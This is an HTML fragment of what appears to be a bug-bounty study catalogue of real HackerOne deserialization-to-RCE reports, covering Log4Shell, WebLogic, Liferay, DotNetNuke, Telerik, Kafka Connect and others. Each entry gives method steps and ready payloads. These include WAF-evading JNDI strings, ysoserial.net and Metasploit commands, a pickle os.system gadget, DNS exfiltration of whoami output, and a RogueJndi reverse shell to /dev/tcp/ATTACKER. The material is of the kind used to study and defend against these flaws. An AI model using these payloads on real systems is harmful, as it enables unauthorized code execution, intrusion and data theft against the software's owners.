+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2248328" target="_blank" rel="noopener">hackerone.com/reports/2248328</a></span><a class="src" href="#report-2248328" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1425474" style="--sv:var(--sev-crit)" data-sev="4" data-votes="75" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Log4Shell (CVE-2021-44228) JNDI lookup injection in request headers</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1425474</b> · acronis · $1000 · 75 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span><span>Chain <b>JNDI lookup -&gt; attacker LDAP referral -&gt; Java deserial</b></span><span>Tag <b>jwt</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Log4j &lt;2.15 evaluates ${jndi:ldap://...} lookups inside logged strings; any user input that gets logged (headers, params) triggers an outbound JNDI/LDAP fetch and deserialization of the attacker's response =&gt; RCE.</p>
+<h4>Method</h4><ol><li>Spin up an interactsh/Collaborator listener.</li><li>Send ${jndi:ldap://HOST.collab/x} in ~30 candidate headers (User-Agent, X-Forwarded-For, Referer, etc.) and the query string.</li><li>An out-of-band LDAP/DNS callback confirms the sink; escalate by serving a malicious LDAP referral to a deserialization gadget.</li></ol>
+<div class="pre">${jndi:ldap://TARGET.COLLAB/test}
+# nested/obfuscated variants to dodge naive WAFs:
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://TARGET.COLLAB/x}
+${jndi:dns://TARGET.COLLAB/x}</div>
+<p class="insight"><b>Insight —</b> Fuzz the JNDI payload across every header and reflectable param; put a unique subdomain per header so the DNS/LDAP callback tells you exactly which field is the logging sink. dns:// works even where outbound LDAP is filtered.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1425474" target="_blank" rel="noopener">hackerone.com/reports/1425474</a></span><a class="src" href="#report-1425474" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-134321" style="--sv:var(--sev-crit)" data-sev="4" data-votes="74" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Leaked Rails secret_key_base in public repo -&gt; CookieStore Marshal RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#134321</b> · algolia · 500 · 74 votes · resolved</div>
+<div class="taxo"><span>Program <b>algolia</b></span><span>Surface <b>web</b></span><span>Chain <b>GitHub recon -&gt; leaked secret_key_base -&gt; forged signe</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Rails secret_key_base was committed to a public GitHub repo; because the app used CookieStore (server-side Marshal of session), an attacker can sign a cookie containing a Ruby object that executes on deserialization.</p>
+<h4>Method</h4><ol><li>Scan the target's org + employee GitHub repos (Gitrob/trufflehog) for secret_token.rb / secret_key_base</li><li>Confirm the app uses CookieStore sessions</li><li>Run metasploit rails_secret_deserialization with the leaked secret (patch cookie regex for '-' in name)</li><li>Get a reverse shell / run id</li></ol>
+<div class="pre">use exploit/multi/http/rails_secret_deserialization
+set secret &lt;leaked_secret_key_base&gt;
+set rhost target
+set railsversion 4
+set targeturi /auth/facebook
+exploit</div>
+<p class="insight"><b>Insight —</b> Recon-driven RCE: enumerate an org's (and employees') public repos for framework secrets. A leaked Rails secret_key_base with CookieStore = deterministic deserialization RCE. Same class as static/known secrets in shipped appliances (#206227).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/134321" target="_blank" rel="noopener">hackerone.com/reports/134321</a></span><a class="src" href="#report-134321" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-576887" style="--sv:var(--sev-crit)" data-sev="4" data-votes="68" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Oracle WebLogic wls-wsat XMLDecoder deserialization RCE (CVE-2017-10271)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#576887</b> · deptofdefense · none · 68 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WebLogic's wls-wsat SOAP endpoint deserializes attacker XML via java.beans.XMLDecoder without restriction, allowing instantiation of arbitrary objects and OS command execution.</p>
+<h4>Method</h4><ol><li>Send a SOAP POST to /wls-wsat/RegistrationPortTypeRPC with an XMLDecoder work:WorkContext</li><li>Prove code execution with a Thread.sleep(12000) payload (12s response delay)</li><li>Swap in a ProcessBuilder payload to run commands (use DNS/OOB if outbound is filtered)</li></ol>
+<div class="pre">POST /wls-wsat/RegistrationPortTypeRPC
+Content-Type: text/xml
+
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java class="java.beans.XMLDecoder"&gt;&lt;object class="java.lang.Thread" method="sleep"&gt;&lt;long&gt;12000&lt;/long&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</div>
+<p class="insight"><b>Insight —</b> For WebLogic, probe /wls-wsat/* and /_async/* with an XMLDecoder Thread.sleep payload as a safe timing oracle before attempting command exec. Timing proof avoids needing outbound egress. Swap Thread-&gt;ProcessBuilder for the real command.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/576887" target="_blank" rel="noopener">hackerone.com/reports/576887</a></span><a class="src" href="#report-576887" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2742457" style="--sv:var(--sev-crit)" data-sev="4" data-votes="62" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Liferay JSONWS unauthenticated deserialization RCE (CVE-2020-7961)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2742457</b> · deptofdefense · none · 62 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth JSONWS invoke -&gt; Java deserialization -&gt; c3p0/S</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Liferay Portal's /api/jsonws/invoke deserializes attacker-supplied JSON into arbitrary classes; supplying a com.mchange.v2.c3p0.WrapperConnectionPoolDataSource with a serialized HexAsciiSerializedMap gadget triggers a chained Transformer/ScriptEngine gadget that runs OS commands, unauthenticated.</p>
+<h4>Method</h4><ol><li>Find a Liferay instance exposing /api/jsonws (default reachable).</li><li>POST to /api/jsonws/invoke calling /expandocolumn/add-column with a +defaultData typed as the c3p0 WrapperConnectionPoolDataSource.</li><li>Embed the HexAsciiSerializedMap Java-deserialization gadget whose payload runs a command from the cmd2 header.</li><li>Read command output in the response.</li></ol>
+<div class="pre">POST /api/jsonws/invoke HTTP/1.1
+Host: TARGET
+cmd2: systeminfo
+Content-Type: application/x-www-form-urlencoded
+
+cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=&lt;token&gt;&amp;tableId=1&amp;name=A&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:&lt;hex gadget with ScriptEngine ProcessBuilder(cmd2)&gt;;"}</div>
+<p class="insight"><b>Insight —</b> JSON web-service endpoints that let the caller pick the deserialized class (Liferay JSONWS, Jackson polymorphic typing, .NET TypeNameHandling) are RCE. The c3p0 WrapperConnectionPoolDataSource + HexAsciiSerializedMap is a reusable Java gadget; the embedded JS/ScriptEngine reads a header (cmd2) so you can change commands without rebuilding the blob.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2742457" target="_blank" rel="noopener">hackerone.com/reports/2742457</a></span><a class="src" href="#report-2742457" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3090123" style="--sv:var(--sev-crit)" data-sev="4" data-votes="59" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>.NET BinaryFormatter deserialization via HTTP header (Sitecore CVE-2025-27218)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#3090123</b> · mars · none · 59 votes · resolved</div>
+<div class="taxo"><span>Program <b>mars</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Sitecore deserializes unsanitized user input taken from the ThumbnailsAccessToken HTTP header using .NET BinaryFormatter; a ysoserial.net gadget in that value executes OS commands.</p>
+<h4>Method</h4><ol><li>Fingerprint Sitecore and confirm the vulnerable endpoint/version.</li><li>Generate a BinaryFormatter payload with ysoserial.net (e.g. TypeConfuseDelegate/ObjectDataProvider -&gt; cmd).</li><li>Send it in the ThumbnailsAccessToken header; command runs as the app pool identity.</li></ol>
+<div class="pre">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"
+# place result in:  ThumbnailsAccessToken: &lt;base64 payload&gt;</div>
+<p class="insight"><b>Insight —</b> On .NET apps, look for opaque base64 blobs in custom headers/cookies/tokens; BinaryFormatter/LosFormatter/ObjectStateFormatter are the classic sinks and ysoserial.net gives ready gadget chains.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3090123" target="_blank" rel="noopener">hackerone.com/reports/3090123</a></span><a class="src" href="#report-3090123" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-274990" style="--sv:var(--sev-crit)" data-sev="4" data-votes="50" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>YAML.load pivot to Marshal.load RCE (RubyGems CVE-2017-0903)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#274990</b> · rubygems · $1500 · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>web</b></span><span>Chain <b>YAML.load -&gt; Marshal.load -&gt; RCE</b></span></div>
+<h4>Root cause</h4><p style="margin:0">rubygems.org hardened gem-spec YAML parsing with Psych.safe_load, but Gem::Package#read_checksums still called plain YAML.load on the gem's checksums file; using app-accessible classes that reachable YAML.load was chained into Marshal.load on attacker data =&gt; RCE.</p>
+<h4>Method</h4><ol><li>Craft a .gem whose checksums entry contains a YAML payload that instantiates classes leading to Marshal.load of attacker bytes.</li><li>POST the gem to /api/v1/gems; Gem::Package.new(body).spec parses it and hits the unsafe read_checksums path.</li><li>Marshal gadget executes (PoC performed a wget/callback).</li></ol>
+<div class="pre">cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- \
+  -H 'Authorization: &lt;api-key&gt;' https://rubygems.org/api/v1/gems</div>
+<p class="insight"><b>Insight —</b> Partial hardening is a trap: one safe_load does not protect a second, forgotten YAML.load/Marshal.load on the same object. Audit every deserialization entry point in a parser, especially secondary files (checksums, metadata) inside an archive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/274990" target="_blank" rel="noopener">hackerone.com/reports/274990</a></span><a class="src" href="#report-274990" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-415501" style="--sv:var(--sev-crit)" data-sev="4" data-votes="46" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bug chain: LFR -&gt; PHP object injection -&gt; XXE/SSRF -&gt; Python pickle RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#415501</b> · h1-5411-ctf · none · 46 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>LFR -&gt; source disclosure -&gt; PHP object injection -&gt;</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A local-file-read primitive exposed source, revealing a PHP unserialize() on uploaded data. A gadget class (ConfigFile) with a __toString() that parses XML enabled XXE/SSRF to an internal service on :1337, which itself deserialized Python pickle -&gt; full RCE.</p>
+<h4>Method</h4><ol><li>Use LFR (template=../../etc/passwd) to read app source and find unserialize() in import endpoint and an XXE-capable gadget class</li><li>Craft a serialized ConfigFile object whose config_raw is an XXE payload; trigger __toString by visiting a page that echoes $_SESSION['memes']</li><li>Point the XXE SYSTEM entity at internal http://localhost:1337 which accepts a base64 Python pickle in a param</li><li>Send a __reduce__/os.system pickle to get a reverse shell</li></ol>
+<div class="pre">a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:239:"&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"http://localhost:1337/\"&gt;]&gt;&lt;note&gt;&lt;template&gt;&amp;xxe;&lt;/template&gt;&lt;/note&gt;";}}
+# python pickle gadget:
+class PickleRce(object):
+    def __reduce__(self):
+        import os; return (os.system,("COMMAND",))</div>
+<p class="insight"><b>Insight —</b> Chain primitives: LFR to recover source is the master key - it turns blind object injection into a targeted gadget hunt. Look for magic methods (__toString/__wakeup/__destruct) reachable from any place the object is echoed/concatenated; XXE is a great SSRF pivot to internal deserializers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/415501" target="_blank" rel="noopener">hackerone.com/reports/415501</a></span><a class="src" href="#report-415501" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2762119" style="--sv:var(--sev-crit)" data-sev="4" data-votes="46" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>.NET XmlSerializer deserialization via DNNPersonalization cookie (CVE-2017-9822)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2762119</b> · mtn_group · none · 46 votes · resolved</div>
+<div class="taxo"><span>Program <b>mtn_group</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">DotNetNuke (5.0.0-9.3.0) deserializes the unauthenticated DNNPersonalization cookie by calling XmlSerializer with an attacker-supplied type name (Type.GetType(typeName)). Using the ExpandedWrapper + ObjectDataProvider gadget an attacker invokes arbitrary methods (file read/write, process start) = RCE. Triggered on the default custom 404 page.</p>
+<h4>Method</h4><ol><li>Confirm DNN version and that a 404 hits the built-in error page</li><li>Generate a payload with ysoserial.net -p DotNetNuke (read_file/write_file/run_command)</li><li>Send it in the DNNPersonalization cookie to any URL (e.g. GET /__)</li><li>Observe file content / reverse shell</li></ol>
+<div class="pre">Cookie: dnn_IsMobile=False; DNNPersonalization=&lt;profile&gt;&lt;item key="key" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"&gt;&lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider&gt;&lt;ProjectedProperty0&gt;&lt;MethodName&gt;WriteFile&lt;/MethodName&gt;&lt;MethodParameters&gt;&lt;anyType xsi:type="xsd:string"&gt;C:\Windows\win.ini&lt;/anyType&gt;&lt;/MethodParameters&gt;&lt;ObjectInstance xsi:type="FileSystemUtils"&gt;&lt;/ObjectInstance&gt;&lt;/ProjectedProperty0&gt;&lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&gt;&lt;/item&gt;&lt;/profile&gt;
+# RCE variant: ysoserial.exe -p DotNetNuke -m run_command -c "powershell iex(...)"</div>
+<p class="insight"><b>Insight —</b> Any .NET app that deserializes user data with a type name it doesn't constrain (XmlSerializer/LosFormatter/BinaryFormatter/Json.NET TypeNameHandling) is RCE via ExpandedWrapper+ObjectDataProvider. For DNN, the trigger surface is the anonymous DNNPersonalization cookie reachable on the default 404 page - no auth needed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2762119" target="_blank" rel="noopener">hackerone.com/reports/2762119</a></span><a class="src" href="#report-2762119" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1529790" style="--sv:var(--sev-crit)" data-sev="4" data-votes="45" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Kafka Connect RCE via JndiLoginModule SASL JAAS config -&gt; LDAP deserialization</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1529790</b> · aiven_ltd · $5000 · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>aiven_ltd</b></span><span>Surface <b>api</b></span><span>Chain <b>connector JAAS config -&gt; outbound LDAP -&gt; deserializat</b></span><span>Tag <b>jwt</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A connector config property (database.history.producer.sasl.jaas.config on the Debezium MySQL connector) accepts an arbitrary JAAS module; setting com.sun.security.auth.module.JndiLoginModule with an attacker LDAP user.provider.url makes the server bind to the attacker's LDAP and deserialize the response =&gt; Java gadget chain RCE.</p>
+<h4>Method</h4><ol><li>Via the Kafka Connect / Aiven REST API, create/patch a Debezium MySQL connector.</li><li>Set sasl.jaas.config to JndiLoginModule pointing user.provider.url at your rogue LDAP (RogueJndi).</li><li>RogueJndi serves a gadget (here: System.setProperty gadget to enable CommonsCollections unsafe deserialization, then CommonsCollections7) yielding a reverse shell.</li></ol>
+<div class="pre">database.history.producer.sasl.jaas.config = com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://ATTACKER" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";
+
+# rogue server:
+java -jar RogueJndi-1.1.jar --hostname ATTACKER -c "bash -c bash -i &gt;&amp; /dev/tcp/ATTACKER/4445 0&gt;&amp;1"</div>
+<p class="insight"><b>Insight —</b> Any config surface that accepts a JAAS/LoginModule string (Kafka Connect, Debezium, Solr, etc.) is a JNDI-&gt;deserialization RCE sink; JndiLoginModule + a rogue LDAP server is the generic exploit.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1529790" target="_blank" rel="noopener">hackerone.com/reports/1529790</a></span><a class="src" href="#report-1529790" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-838196" style="--sv:var(--sev-crit)" data-sev="4" data-votes="45" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Telerik UI RadAsyncUpload RCE chain (CVE-2017-11317 upload + CVE-2019-18935 deserialization)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#838196</b> · deptofdefense · none · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>weak-key file upload (CVE-2017-11317) -&gt; insecure deseria</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Outdated Telerik.Web.UI RadAsyncUpload uses a weak/known encryption key (CVE-2017-11317) allowing arbitrary file upload, and the async-upload handler insecurely deserializes the rauPostData JSON via JavaScriptSerializer (CVE-2019-18935); uploading a mixed-mode DLL and deserializing a type that loads it yields RCE.</p>
+<h4>Method</h4><ol><li>Find the handler: GET /Telerik.Web.UI.WebResource.axd?type=rau returns 'RadAsyncUpload handler is registered successfully'.</li><li>Brute the product version with RAU_crypto.py against versions.txt until a file upload succeeds (proves the known key).</li><li>Compile a mixed-mode DLL (PoC: Sleep(10000) in DllMain), upload it, then run CVE-2019-18935.py to deserialize a type that loads the DLL from its upload path.</li><li>A ~10s response delay proves code execution.</li></ol>
+<div class="pre"># detect + version brute:
+curl -sk 'https://TARGET/Telerik.Web.UI.WebResource.axd?type=rau'
+for V in $(cat versions.txt); do python3 RAU_crypto.py -P 'C:\\Windows\\Temp' "$V" testfile.txt 'https://TARGET/Telerik.Web.UI.WebResource.axd?type=rau' | grep fileInfo; done
+# exploit:
+python3 CVE-2019-18935.py -u 'https://TARGET/Telerik.Web.UI.WebResource.axd?type=rau' -v 2016.2.607.40 -f 'C:\\Windows\\Temp' -p sleep_amd64.dll</div>
+<p class="insight"><b>Insight —</b> The RadAsyncUpload handler URL (?type=rau) is a reliable fingerprint; if the version is old, the encryption key is public so you get upload + deserialization for free. Use a Sleep() DLL as a safe RCE proof.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/838196" target="_blank" rel="noopener">hackerone.com/reports/838196</a></span><a class="src" href="#report-838196" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1391576" style="--sv:var(--sev-crit)" data-sev="4" data-votes="36" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>.NET LosFormatter RCE via __VSTATE parameter (HigherLogic)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1391576</b> · 8x8-bounty · none · 36 votes · resolved</div>
+<div class="taxo"><span>Program <b>8x8-bounty</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A HigherLogic community platform page deserializes the user-supplied __VSTATE parameter with LosFormatter, which is unsafe for untrusted input. A ysoserial.net TypeConfuseDelegate gadget yields RCE.</p>
+<h4>Method</h4><ol><li>Locate a page exposing a __VSTATE parameter</li><li>Generate a LosFormatter payload with ysoserial.net (TypeConfuseDelegate), gzip+base64 encode as the app expects</li><li>Insert into __VSTATE and submit; confirm via OOB DNS</li></ol>
+<div class="pre">ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping COLLAB.interactsh.com" -o raw | base64 -d | gzip - | base64 -w0
+# paste result into the __VSTATE form field and submit</div>
+<p class="insight"><b>Insight —</b> __VSTATE / __VIEWSTATE-style parameters on ASP.NET pages are LosFormatter/ObjectStateFormatter deserialization sinks - test them with ysoserial.net. Note the app-specific encoding wrapper (here base64-&gt;gzip-&gt;base64). Third-party platforms (HigherLogic) reused across many programs multiply the finding.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1391576" target="_blank" rel="noopener">hackerone.com/reports/1391576</a></span><a class="src" href="#report-1391576" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-728614" style="--sv:var(--sev-crit)" data-sev="4" data-votes="28" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Apache Flex BlazeDS AMF deserialization (CVE-2017-5641)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#728614</b> · deptofdefense · awarded · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>AMF deserialization -&gt; RMI/JNDI -&gt; gadget chain -&gt; </b></span></div>
+<h4>Root cause</h4><p style="margin:0">A /messagebroker/amf endpoint deserializes untrusted AMF (application/x-amf) with BlazeDS; a crafted AMF object graph (sun.rmi.server.UnicastRef) forces an outbound RMI/DNS lookup, confirming unsafe deserialization exploitable to RCE with a gadget chain.</p>
+<h4>Method</h4><ol><li>Send a plain collaborator host in the AMF body first -- nothing happens (rules out a naive URL-fetch false positive).</li><li>Then send the host embedded in a serialized AMF UnicastRef payload; a blind DNS/RMI pingback proves deserialization.</li><li>Escalate with a full ysoserial gadget for RCE.</li></ol>
+<div class="pre">amf_payload = b'\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a\x07\x33' + b'sun.rmi.server.UnicastRef' + struct.pack('&gt;H', len(HOST)) + HOST + struct.pack('&gt;I', PORT) + b'\xf9jv{|\xdehOv\xd8\xaa=\x00\x00\x01[\xb0L\x1d\x81\x80\x01\x00'
+# POST to /messagebroker/amf with Content-Type: application/x-amf</div>
+<p class="insight"><b>Insight —</b> application/x-amf endpoints (/messagebroker/amf) are Java deserialization sinks. Use the differential test (plain host vs host-inside-serialized-object) to prove it's deserialization and not a URL fetch; sun.rmi.server.UnicastRef gives a clean DNS/RMI canary.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/728614" target="_blank" rel="noopener">hackerone.com/reports/728614</a></span><a class="src" href="#report-728614" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-810778" style="--sv:var(--sev-crit)" data-sev="4" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Oracle WebLogic wls-wsat WorkContext XMLDecoder RCE (CVE-2017-3506/10271)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#810778</b> · mtn_group · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>mtn_group</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The WebLogic wls-wsat SOAP endpoints deserialize the WorkContext SOAP header with java.beans.XMLDecoder, which instantiates arbitrary classes; a ProcessBuilder object with a start() method yields unauthenticated OS command execution.</p>
+<h4>Method</h4><ol><li>POST a SOAP envelope to /wls-wsat/CoordinatorPortType or /wls-wsat/RegistrationRequesterPortType</li><li>Use a Thread.sleep XMLDecoder object for safe blind detection (timing)</li><li>Escalate to a java.lang.ProcessBuilder object running /bin/bash -c with an OOB DNS callback to confirm RCE</li></ol>
+<div class="pre">POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
+Host: TARGET
+Content-Type: text/xml
+
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
+      &lt;java&gt;
+        &lt;object class="java.lang.ProcessBuilder"&gt;
+          &lt;array class="java.lang.String" length="3"&gt;
+            &lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;
+            &lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;
+            &lt;void index="2"&gt;&lt;string&gt;ping `whoami`.COLLAB.burpcollaborator.net&lt;/string&gt;&lt;/void&gt;
+          &lt;/array&gt;
+          &lt;void method="start"/&gt;
+        &lt;/object&gt;
+      &lt;/java&gt;
+    &lt;/work:WorkContext&gt;
+  &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;</div>
+<p class="insight"><b>Insight —</b> Detect WebLogic RCE safely with a Thread.sleep XMLDecoder object (measure response delay) before firing ProcessBuilder. Backtick command substitution inside the ping argument exfiltrates command output via DNS for blind targets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/810778" target="_blank" rel="noopener">hackerone.com/reports/810778</a></span><a class="src" href="#report-810778" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-415222" style="--sv:var(--sev-crit)" data-sev="4" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP object injection __toString gadget -&gt; XXE -&gt; SSRF (LFI-assisted)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#415222</b> · h1-5411-ctf · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>filter-bypass LFI -&gt; source disclosure -&gt; PHP object i</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A meme generator loaded templates via a 'template' path param filtered only for type=image; switching type=text bypassed the filter to LFI/read source. The source revealed an unserialize() sink on uploaded data plus a ConfigFile class whose __toString() parses XML, giving PHP object injection -&gt; XXE -&gt; SSRF.</p>
+<h4>Method</h4><ol><li>Bypass the LFI filter by toggling a sibling parameter (type=text instead of image) to read /var/www source</li><li>Locate an unserialize() on user-uploaded/session data and a class with a dangerous magic method (__toString -&gt; XML parse)</li><li>Craft a serialized ConfigFile object so its __toString triggers XXE, then pivot to SSRF/internal port scan</li></ol>
+<div class="pre">&lt;?php
+$config = new ConfigFile("data:text/html,PAYLOAD");
+echo serialize([$config]);
+// a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:11:"placeholder";}}
+?&gt;</div>
+<p class="insight"><b>Insight —</b> Chain pattern: a weak filter bypassed by a neighboring param -&gt; LFI to read source -&gt; find unserialize() + a magic-method gadget (__toString/__wakeup/__destruct) -&gt; object injection into XXE/SSRF. Always grep recovered source for unserialize and magic methods.</p>
